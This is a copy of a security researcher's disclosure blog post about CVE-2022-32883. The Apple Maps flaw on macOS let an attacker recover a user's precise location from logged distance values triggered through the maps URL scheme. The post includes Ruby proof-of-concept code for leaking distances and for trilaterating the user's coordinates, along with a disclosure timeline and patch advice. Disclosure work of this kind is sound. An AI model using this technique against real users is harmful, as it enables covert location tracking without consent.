---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-18_turning-your-computer-into-a-gps-tracker-with-apple-maps.md
original_filename: 2022-09-18_turning-your-computer-into-a-gps-tracker-with-apple-maps.md
title: Turning Your Computer Into a GPS Tracker With Apple Maps
category: documents
detected_topics:
- access-control
- command-injection
- automation-abuse
- clickjacking
- information-disclosure
- api-security
tags:
- imported
- documents
- access-control
- command-injection
- automation-abuse
- clickjacking
- information-disclosure
- api-security
language: en
raw_sha256: 3b672aae0b461abc117c32a79aa9a2d3b1f4558bf371855acdd3ced8fc2fea2f
text_sha256: 420ceb2dd2be165789a25a34135b913b792fdb6ff8316ae30621d59d77a68e81
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Turning Your Computer Into a GPS Tracker With Apple Maps

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-18_turning-your-computer-into-a-gps-tracker-with-apple-maps.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, automation-abuse, clickjacking, information-disclosure, api-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `3b672aae0b461abc117c32a79aa9a2d3b1f4558bf371855acdd3ced8fc2fea2f`
- Text SHA256: `420ceb2dd2be165789a25a34135b913b792fdb6ff8316ae30621d59d77a68e81`


## Content

---
title: "Turning Your Computer Into a GPS Tracker With Apple Maps"
url: "https://breakpoint.sh/posts/turning-your-computer-into-a-gps-tracker-with-apple-maps"
final_url: "https://breakpoint.sh/posts/turning-your-computer-into-a-gps-tracker-with-apple-maps"
authors: ["Ron Masas (@RonMasas)"]
programs: ["Apple"]
bugs: ["Privacy issue", "Information disclosure"]
publication_date: "2022-09-18"
added_date: "2022-09-19"
source: "pentester.land/writeups.json"
original_index: 2154
---

# [Breakpoint](/)

  * [RESEARCH](/research)
  * [ABOUT](/about)
  * [CONTACT](/cdn-cgi/l/email-protection#5234203d3f7f213b2637123020373339223d3b3c263e26367c313d3f)

# Turning Your Computer Into a GPS Tracker With Apple Maps

Ron Masas

4 minute read

18 September, 2022

![](/apple-maps/cover.png)

Content

1. Finding The Vulnerability2. Exploitation3. Conclusion

* * *

Timeline

Report sent to Apple

13 February, 2022

Apple validated the report

9 May, 2022

Apple requested credit information

24 August, 2022

Apple assigns CVE-2022-32883 for this vulnerability

12 September, 2022

Still waiting for the bounty decision

18 September, 2022

One of the things Apple cares about in terms of its bug bounty program is your location data. Apple rightly categorizes real-time or historical precise location data as "sensitive data" which in some cases qualifies for a [significant monetary award](https://developer.apple.com/security-bounty/#:~:text=user%2Dinstalled%20app-,Unauthorized%20access%20to%20sensitive%20data**,-%24100%2C000).

I decided to look into macOS applications that use the user location, and as you can probably tell by the title of this article, Apple Maps was my obvious choice.

I found and disclosed 2 vulnerabilities in Apple Maps that allowed me to extract the accurate location of the user without authorization. This post is going to cover the first vulnerability [CVE-2022-32883](https://support.apple.com/en-us/HT213444#:~:text=with%20improved%20restrictions.-,CVE%2D2022%2D32883,-%3A%20Ron%20Masas%2C%20breakpointhq).

## Finding The Vulnerability

This vulnerability was indeed a low-hanging fruit. I was using the Console application on macOS to see log messages from the Maps process, and while I was clicking on different restaurants on the map I noticed the following log message:

Maps[13621:4749765] GEOQuickETAResponse: <GEOQuickETAResponse: 0x6000005a9e00> etas: ( "<GEOETAResultByType: 0x600000f27410> { **distance = 3951;** historicTravelTime = 1058; \"static_travel_time\" = 1000; 

Apple Maps writes the data above to stderr every time a location is clicked. I also knew about the Maps URL Scheme, which was crucial for this attack. After a few minutes of trial and error, I found that by using the “q” parameter; I could remotely trigger this behavior while controlling the coordinates the distance value will be calculated from.

I started the Apple Maps process by opening the following URL

http://maps.apple.com/?q=<latitude>,<longitude>

Which caused the Maps app to open and automatically select the coordinates I supplied, triggering the calculation and subsequent log of the distance from that location.

## Exploitation

For my exploit proof of concept, I made a script that first approximates the user location coordinates by IP and then reduces the distance iteratively by slightly changing those coordinates.

I’m sure there is a smarter, more efficient way to do that, but hey, it works, and that was good enough for the proof of concept.

I sent Apple two scripts, the first just demonstrates how the distance can be extracted from a given latitude and longitude, and the second is the full "trilateration" script that was able to extract the user's exact location in about 200 seconds.

Below is the main code for leaking the distance from an arbitrary coordinates. You can find the full proof of concept scripts on my [GitHub repository](https://github.com/breakpointHQ/CVE-2022-32883).
  
  
  #!/usr/bin/ruby
  
  def search_in_maps(location, file_path)
  flags = HIDE_MAP ? '-j -g' : ''
  location = URI.escape location
  `open #{flags} --stderr #{file_path} -a maps \"http://maps.apple.com/?q=#{location}\"`
  end
  
  def extract_distance_data(file_path)
  distance = nil
  content = File.read(file_path)
  lines = content.split("\n")
  
  for line in lines
  if line.include? "FAILED_NO_RESULT"
  raise StandardError.new 'Maps could not resolve the provided coordinates.'
  end
  if line.include? "AUTOMOBILE"
  matches = line.match(/distance = (\d+);/i)
  if matches != nil
  distance = matches.captures[0].to_f
  end
  end
  end
  
  return distance
  end
  

And here is a slim down version of my "trilateration" script.
  
  
  #!/usr/bin/ruby
  
  #...
  
  def main
  wifi_warning
  start_at = Time.now.to_i
  
  begin
  # this uses ip to location database to find an approximate location
  approximate_location = approximate_location_by_ip
  
  best_coord = Coord.new approximate_location.latitude, approximate_location.longitude
  best_distance = get_distance_from best_coord.to_s
  
  # this is the distance we step in every direction, divided in half on every iteration.
  step = 0.1 + (best_distance/1000) / 4
  
  log "distance=#{best_distance/1000}km, coord=#{best_coord}, step=#{step}, accuracy_radius=#{approximate_location.accuracy_radius}km", YELLOW
  
  while true
  # finds if we should be scanning right or left
  lng_direction = lng_find_direction best_coord, 0.5
  
  # iteratively reduce distance and update "best_coord"
  for i in 1...5
  print "🛰️ "
  km = (step * i) * lng_direction
  new_coord = best_coord.lng_add_km km
  new_distance = distance_from new_coord
  if new_distance == nil
  break
  end
  if new_distance < best_distance
  best_distance = new_distance
  best_coord = new_coord
  log "\n📍 NEW BEST: distance=#{best_distance/1000}km, coord=#{best_coord.to_s}", GREEN
  if step > best_distance/1000
  break
  end
  end
  end
  
  print " "
  
  # finds if we should be scanning top or bottom
  lat_direction = lat_find_direction best_coord, 0.5
  
  # iteratively reduce distance and update "best_coord"
  for i in 1...5
  print "🛰️ "
  km = (step * i) * lat_direction
  new_coord = best_coord.lat_add_km km
  new_distance = distance_from new_coord
  if new_distance == nil
  break
  end
  if new_distance < best_distance
  best_distance = new_distance
  best_coord = new_coord
  log "\n📍 NEW BEST: distance=#{best_distance/1000}km, coord=#{best_coord.to_s}", GREEN
  if step > best_distance/1000
  break
  end
  end
  end
  
  # this is a small optimation to account for cases when we quickly find the location
  step = [step / 2, (best_distance/1000) / 4].min
  
  # we are only a few meters away, we can stop the script
  if step <= 0.02 || step > best_distance/1000
  log "\nDONE, distance=#{best_distance/1000}km, coord=#{best_coord.to_s}", GREEN
  break
  end
  
  log "\nnext step size=#{step}, time=#{(Time.now.to_i-start_at)} seconds", YELLOW
  end
  
  rescue StandardError => err
  log "ERROR: #{err}", RED
  end
  end
  
  #...
  

## Conclusion

Analyzing the different outputs of sensitive applications can be incredibly helpful for finding vulnerabilities.

Please don't forget to update your devices running iOS and iPadOS to iOS 15.7/16 and iPadOS 15.7 and macOS Monterey to 12.6.

Timeline

Report sent to Apple

13 February, 2022

Apple validated the report

9 May, 2022

Apple requested credit information

24 August, 2022

Apple assigns CVE-2022-32883 for this vulnerability

12 September, 2022

Still waiting for the bounty decision

18 September, 2022

### Open Source

  * [VooDoo](https://github.com/breakpointHQ/VOODOO)
  * [Snoop](https://github.com/breakpointHQ/snoop)
  * [Chrome Bandit](https://github.com/breakpointHQ/chrome-bandit)
  * [TCC ClickJacking](https://github.com/breakpointHQ/TCC-ClickJacking)

### Company

  * [About](/about)
  * [Github](https://github.com/breakpointHQ)
  * [Research](/research)

### Imprint

BreakPoint Technologies LTD  
Israel, HaPninim 1  
6803001 Tel Aviv-Jaffa
